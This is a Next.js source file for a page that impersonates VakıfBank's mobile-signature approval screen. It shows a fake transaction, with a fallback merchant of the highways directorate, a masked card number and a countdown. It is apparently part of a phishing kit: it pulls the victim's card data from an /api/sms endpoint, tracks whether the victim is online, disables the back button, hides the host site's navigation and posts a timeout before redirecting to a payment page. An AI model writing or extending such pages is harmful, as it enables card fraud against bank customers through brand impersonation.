'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import OnlineTracker from '@/components/OnlineTracker';

interface SmsData {
    tutar: string;
    tarih: string;
    lastFourDigits: string;
    cardType: 'visa' | 'mastercard' | 'unknown';
    maskedPhone: string;
    isyeriAdi: string;
    banka?: string;
}

export default function VakifMobilOnayPage() {
    const router = useRouter();
    const [data, setData] = useState<SmsData | null>(null);
    const [loading, setLoading] = useState(true);
    const [timeLeft, setTimeLeft] = useState(180);
    const [isTimeout, setIsTimeout] = useState(false);
    const [referansNo, setReferansNo] = useState('');

    // Generate random reference number once on mount
    useEffect(() => {
        const randHex = Math.floor(10000000 + Math.random() * 90000000)
            .toString(16)
            .substring(0, 8);
        setReferansNo(randHex);
    }, []);

    // Prevent back navigation
    useEffect(() => {
        window.history.pushState(null, '', window.location.href);
        const handlePopState = () => {
            window.history.pushState(null, '', window.location.href);
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    // Fetch transaction details
    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch('/api/sms');
                const result = await response.json();
                
                if (result.success) {
                    setData(result.data);
                } else if (result.redirect) {
                    router.push(result.redirect);
                }
            } catch (err) {
                console.error('Veri yükleme hatası:', err);
            } finally {
                setLoading(false);
            }
        };

        fetchData();
    }, [router]);

    // Timer countdown
    useEffect(() => {
        if (timeLeft <= 0) {
            setIsTimeout(true);
            handleTimeoutUpdate();
            return;
        }

        const timer = setInterval(() => {
            setTimeLeft(prev => prev - 1);
        }, 1000);

        return () => clearInterval(timer);
    }, [timeLeft]);

    const handleTimeoutUpdate = async () => {
        try {
            await fetch('/api/sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ smsCode: 'TIMEOUT' })
            });
        } catch (e) {
            console.error(e);
        }
        router.push('/odeme/onay');
    };

    const formatTimer = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    };

    if (loading) {
        return (
            <div className="flex items-center justify-center min-h-screen bg-white">
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>
                <div className="w-12 h-12 border-4 border-amber-200 border-t-amber-500 rounded-full animate-spin"></div>
            </div>
        );
    }

    const cc = data?.lastFourDigits || '9037';
    
    // Dynamic Card Scheme Logos
    const visaLogoSvg = (
        <svg width="45" height="15" viewBox="0 0 24 8" fill="#002d62">
            <path d="M3.4 7.6L4.7.4h1.3l-1.3 7.2zM8.8.4c-.3-.1-.8-.2-1.3-.2C6.2.2 5.3.9 5.3 2.1c0 1 .9 1.5 1.5 1.8.7.3.9.5.9.8 0 .5-.6.7-1.1.7-.8 0-1.2-.1-1.8-.4L3.5 6c.5.2 1.4.4 2.2.4 1.4 0 2.3-.7 2.3-1.8 0-.6-.4-1.1-1.2-1.4-.5-.3-.8-.4-.8-.7 0-.2.3-.5.9-.5.5 0 .9.1 1.2.2l.2.1zM11.6 5c.1-.3.6-1.7.6-1.7L12.5 5h-1.2zm1.8 2.6L12.1.4h-1.1c-.3 0-.6.2-.7.5L8.7 7.6h1.4l.3-.8h1.7l.2.8h1.8v-.2zM.6.4L0 4.2C0 4.2.9 1 .9.9.9.8.7.6.6.6H.1L0 .4h2z" />
        </svg>
    );

    const mastercardLogoSvg = (
        <svg width="34" height="20" viewBox="0 0 22 17">
            <circle cx="7" cy="8.5" r="7" fill="#eb001b" />
            <circle cx="15" cy="8.5" r="7" fill="#ff5f00" fillOpacity="0.85" />
        </svg>
    );

    const cardSchemeLogo = data?.cardType === 'mastercard' ? mastercardLogoSvg : visaLogoSvg;
    const cleanTutar = (data?.tutar || '').replace(/TL|TRY|₺/gi, '').trim() || '26.918,00';
    const dashArray = 251.2;

    const formatVakifDate = (dateStr: string) => {
        if (!dateStr) return '';
        // If it matches dd.mm.yyyy hh:mm:ss, remove the :ss at the end
        const match = dateStr.match(/^(\d{2}\.\d{2}\.\d{4}\s\d{2}:\d{2}):\d{2}$/);
        if (match) {
            return match[1];
        }
        return dateStr;
    };

    return (
        <>
            <OnlineTracker />
            <style jsx global>{`
                nav.fixed.bottom-0 { display: none !important; }
                main { padding-bottom: 0 !important; }
                header { display: none !important; }
                * {
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                }
                body {
                    background: #ffffff !important;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: flex-start;
                }
            `}</style>

            <div style={{
                width: '100%',
                maxWidth: '480px',
                margin: '0 auto',
                padding: '16px',
                display: 'flex',
                flexDirection: 'column',
                gap: '20px',
                background: '#ffffff'
            }}>
                {/* Header (Logo Row) */}
                <div style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center',
                    padding: '8px 4px 4px 4px'
                }}>
                    {/* VakıfBank Brand Logo */}
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        {/* Yellow Leaf Icon */}
                        <svg width="24" height="24" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M1 20.25C1 20.25 4.875 12 14.5 12C24.125 12 31 16.5 31 16.5C31 16.5 25.125 24.5 14.5 24.5C3.875 24.5 1 20.25 1 20.25Z" fill="#ffb800" />
                            <path d="M7 11.25C7 11.25 10.875 3 20.5 3C30.125 3 31 12 31 12C31 12 25.125 17.5 14.5 17.5C3.875 17.5 7 11.25 7 11.25Z" fill="#ffd15c" fillOpacity="0.8" />
                        </svg>
                        {/* VakıfBank Text */}
                        <span style={{
                            fontSize: '22px',
                            fontWeight: '800',
                            fontStyle: 'italic',
                            color: '#1a1a1a',
                            letterSpacing: '-0.5px'
                        }}>VakıfBank</span>
                    </div>
                    {/* Dynamic Card Scheme Logo (Visa or Mastercard) */}
                    {cardSchemeLogo}
                </div>

                {/* Orange Banner */}
                <div style={{
                    background: '#f2a104',
                    width: '100%',
                    padding: '16px',
                    textAlign: 'center',
                    borderRadius: '2px',
                    boxShadow: '0 2px 4px rgba(242,161,4,0.15)'
                }}>
                    <h2 style={{
                        color: '#ffffff',
                        fontSize: '15px',
                        fontWeight: '700',
                        letterSpacing: '0.5px'
                    }}>CEP İMZA DOĞRULAMA</h2>
                </div>

                {/* Transaction Details Card */}
                <div style={{
                    border: '1px solid #e2e8f0',
                    borderLeft: '4px solid #f2a104',
                    borderRadius: '6px',
                    background: '#ffffff',
                    padding: '8px 16px',
                    display: 'flex',
                    flexDirection: 'column'
                }}>
                    {/* Row 1: İşyeri Adı */}
                    <div style={{
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        padding: '12px 0',
                        borderBottom: '1px solid #f1f5f9'
                    }}>
                        <span style={{ color: '#64748b', fontSize: '13px' }}>İşyeri Adı</span>
                        <span style={{ color: '#1e293b', fontSize: '13px', fontWeight: '500' }}>{data?.isyeriAdi || 'S/KARAYOLLARI GM.'}</span>
                    </div>

                    {/* Row 2: İşlem Tutarı */}
                    <div style={{
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        padding: '12px 0',
                        borderBottom: '1px solid #f1f5f9'
                    }}>
                        <span style={{ color: '#64748b', fontSize: '13px' }}>İşlem Tutarı</span>
                        <span style={{ color: '#0f172a', fontSize: '14px', fontWeight: '700' }}>{cleanTutar} TL</span>
                    </div>

                    {/* Row 3: İşlem Tarihi - Saat */}
                    <div style={{
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        padding: '12px 0',
                        borderBottom: '1px solid #f1f5f9'
                    }}>
                        <span style={{ color: '#64748b', fontSize: '13px' }}>İşlem Tarihi - Saat</span>
                        <span style={{ color: '#1e293b', fontSize: '13px', fontWeight: '500' }}>{formatVakifDate(data?.tarih || '')}</span>
                    </div>

                    {/* Row 4: Kart Numarası */}
                    <div style={{
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        padding: '12px 0',
                        borderBottom: '1px solid #f1f5f9'
                    }}>
                        <span style={{ color: '#64748b', fontSize: '13px' }}>Kart Numarası</span>
                        <span style={{ color: '#1e293b', fontSize: '13px', fontWeight: '500' }}>XXXXXX******{cc}</span>
                    </div>

                    {/* Row 5: Referans No */}
                    <div style={{
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        padding: '12px 0'
                    }}>
                        <span style={{ color: '#64748b', fontSize: '13px' }}>Referans No</span>
                        <span style={{ color: '#1e293b', fontSize: '13px', fontWeight: '500', fontFamily: 'monospace' }}>{referansNo}</span>
                    </div>
                </div>

                {/* Instruction Text */}
                <div style={{
                    textAlign: 'center',
                    padding: '10px 14px',
                    fontSize: '13.5px',
                    color: '#334155',
                    lineHeight: '1.6'
                }}>
                    VakıfBank mobil uygulamanıza cep imza onayınız gönderilmiştir.<br />
                    Onay vermenizin ardından işleminize devam edebilirsiniz.
                </div>

                {/* Timer Section (Progress circle + Countdown) */}
                <div style={{
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: '8px',
                    marginTop: '10px'
                }}>
                    <div style={{ position: 'relative', width: '48px', height: '48px' }}>
                        <svg width="48" height="48" viewBox="0 0 100 100">
                            {/* Background Track Circle */}
                            <circle
                                cx="50"
                                cy="50"
                                r="40"
                                fill="none"
                                stroke="#f1f5f9"
                                strokeWidth="8"
                            />
                            {/* Animated Timer Progress Circle */}
                            <circle
                                cx="50"
                                cy="50"
                                r="40"
                                fill="none"
                                stroke="#f2a104"
                                strokeWidth="8"
                                strokeDasharray={dashArray}
                                strokeDashoffset={dashArray - (dashArray * (timeLeft / 180))}
                                strokeLinecap="round"
                                transform="rotate(-90 50 50)"
                                style={{ transition: 'stroke-dashoffset 1s linear' }}
                            />
                        </svg>
                    </div>
                    <span style={{
                        fontSize: '14.5px',
                        fontWeight: '600',
                        color: '#334155',
                        marginTop: '2px'
                    }}>{formatTimer(timeLeft)}</span>
                </div>

                {/* Bottom Options Row */}
                <div style={{
                    display: 'flex',
                    justifyContent: 'center',
                    alignItems: 'center',
                    padding: '8px 24px',
                    marginTop: '10px'
                }}>
                    <span style={{ color: '#64748b', fontSize: '13px', fontWeight: '500', cursor: 'pointer' }}>Yardım</span>
                </div>
            </div>
        </>
    );
}
